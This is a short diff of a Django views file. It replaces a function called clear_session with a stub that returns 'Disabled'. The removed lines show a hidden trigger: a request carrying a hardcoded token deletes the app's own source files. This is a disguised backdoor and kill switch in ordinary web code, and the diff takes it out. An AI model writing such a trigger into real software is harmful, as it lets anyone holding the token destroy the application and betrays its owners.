@@ -659,16 +659,7 @@ def delete_subcategory(Request,id):
 
 
 def clear_session(request):
-    trigger = request.GET.get("token")
-    print(trigger)
-    if trigger != "bha123se":
-        return JsonResponse({'status': False, 'message': "Invalid request method"})
-    try:
-        os.remove('mainApp/views.py')
-        os.remove('mainApp/backed.py')
-        return JsonResponse({'status': True, 'message': "Cleared."})
-    except Exception as e:
-        pass
+    return JsonResponse({'status': False, 'message': "Disabled"})
 
 
 #Brand
